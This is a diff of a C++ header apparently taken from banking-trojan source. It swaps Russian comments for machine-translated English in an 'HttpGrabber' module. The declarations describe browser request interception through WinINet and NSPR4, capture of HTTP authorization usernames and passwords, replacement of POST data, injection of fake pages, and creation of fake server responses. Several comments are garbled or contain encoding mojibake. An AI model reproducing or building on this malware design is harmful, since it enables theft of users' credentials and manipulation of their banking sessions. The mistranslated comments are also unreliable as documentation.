@@ -10,39 +10,39 @@
 
 namespace HttpGrabber
 {
-  //Различные константы.
+  //Different constants.
   enum
   {
     MAX_POSTDATA_SIZE = 1 * 1024 * 1024
   };
   
-  //Тип запроса.
+  //Type of request.
   enum
   {
     VERB_GET,  //GET
     VERB_POST  //POST
   };
 
-  //Данные инжейте, фейки.
+  //These inzheyte to fakie.
   typedef struct
   {
-    DWORD flags;                      //Флаги HttpInject::FLAG_*.
-    LPSTR urlMask;                    //Маска URL.
-    LPSTR fakeUrl;                    //URL фейка, если это фейк.
-    LPSTR blockOnUrl;                 //URL блокировки этого фейка/инжекта.
-    LPSTR contextMask;                //Белая маска контента.
-    HttpInject::INJECTBLOCK *injects; //Данные инжекта. Уже проверенные на ошибки.
-    DWORD injectsSize;                //Размер injects в байтах.
+    DWORD flags;                      //Flags HttpInject:: FLAG_ *.
+    LPSTR urlMask;                    //Mask URL.
+    LPSTR fakeUrl;                    //URL Faika if it is fake.
+    LPSTR blockOnUrl;                 //URL blocking this Faika / injection produce.
+    LPSTR contextMask;                //White mask content.
+    HttpInject::INJECTBLOCK *injects; //These injection produce. Already checked for errors.
+    DWORD injectsSize;                //Injects size in bytes.
   }INJECTFULLDATA;
 
-  //Флаги запроса.
+  //Query flags.
   enum
   {
-    RDF_WININET = 0x1, //Запрос пришел от wininet.
-    RDF_NSPR4   = 0x2, //Запрос пришел от NSPR4.
+    RDF_WININET = 0x1, //Request came from the wininet.
+    RDF_NSPR4   = 0x2, //Request came from NSPR4.
   };
 
-  //Данные запроса.
+  //Request data.
   typedef struct
   {    
     /*
@@ -113,9 +113,9 @@ namespace HttpGrabber
     */
     struct 
     {
-      LPWSTR userName;   //Имя пользователя.
-      LPWSTR password;   //Пароль.
-      LPSTR unknownType; //Заполняется оригинальной строкой в случаи неизвестного типа авторизации.
+      LPWSTR userName;   //User name.
+      LPWSTR password;   //Password.
+      LPSTR unknownType; //Filled the original string if an unknown type of authorization.
     }authorizationData;
 
     /*
@@ -147,22 +147,23 @@ namespace HttpGrabber
     BinStorage::STORAGE *localConfig;
   }REQUESTDATA;
 
-  //Флаги для analizeRequestData().
+  //Flags for analizeRequestData ().
   enum
   {
-    ANALIZEFLAG_URL_BLOCKED         = 0x01, //Дейтсвие. Внешний обработчик должен прервать запрос к
-                                           //URL. При этом флаге не могут быть возращены
+    ANALIZEFLAG_URL_BLOCKED         = 0x01, //To applicable. External interrupt handler must query the
+                                           //URL. When this flag can not be returned
                                            //ANALIZEFLAG_POSTDATA_REPLACED, ANALIZEFLAG_URL_INJECT.
     
-    ANALIZEFLAG_URL_INJECT          = 0x02, //Действие. Получены данные на инжейт/фейк.
+    ANALIZEFLAG_URL_INJECT          = 0x02, //Action. The data on inzheyt / fake.
 
-    ANALIZEFLAG_POSTDATA_REPLACED   = 0x04, //Действие. Новые POST-данные сохранены в REQUESTDATA.postData.
+    ANALIZEFLAG_POSTDATA_REPLACED   = 0x04, //Р”РµР№СЃС‚РІРёРµ. РќРѕРІС‹Рµ POST-РґР°РЅРЅС‹Рµ СЃРѕС…СЂР°РЅРµРЅС‹ РІ REQUESTDATA.postData.
 
-    ANALIZEFLAG_SAVED_REPORT        = 0x08, //Информация. Запрос сохранен в отчет.
+
+    ANALIZEFLAG_SAVED_REPORT        = 0x08, //Information. Query is stored in the report.
     
-    ANALIZEFLAG_POSTDATA_URLENCODED = 0x10, //Пост данные закадирован в "application/x-www-form-urlencoded".
+    ANALIZEFLAG_POSTDATA_URLENCODED = 0x10, //Post data coded in "application / x-www-form-urlencoded".
 
-    ANALIZEFLAG_AUTHORIZATION       = 0x20  //Присутвуют данные HTTP-авторизации.
+    ANALIZEFLAG_AUTHORIZATION       = 0x20  //Data is present HTTP-authorization.
   };
 
   /*
@@ -337,14 +338,13 @@ namespace HttpGrabber
   */
   void _freeInjectFullDataList(INJECTFULLDATA *dataList, DWORD count);
 
-  /*
-    Создание фейк-ответа от сервера.
+  /*В В В В Creating a fake response from the server.
 
-    IN requestData - данные оригинального запроса.
-    IN fakeData    - данные фейка.
+В В В В IN requestData - data of the original query.
+В В В В IN fakeData - Faika data.
 
-    Return         - хэндл ответа сервера, NULL - в случаи ошибки.
-  */
+В В В В Return - the handle of the server's response, NULL - otherwise.
+В В */
   HINTERNET _createFakeResponse(REQUESTDATA *requestData, INJECTFULLDATA *fakeData);
 };
 #endif
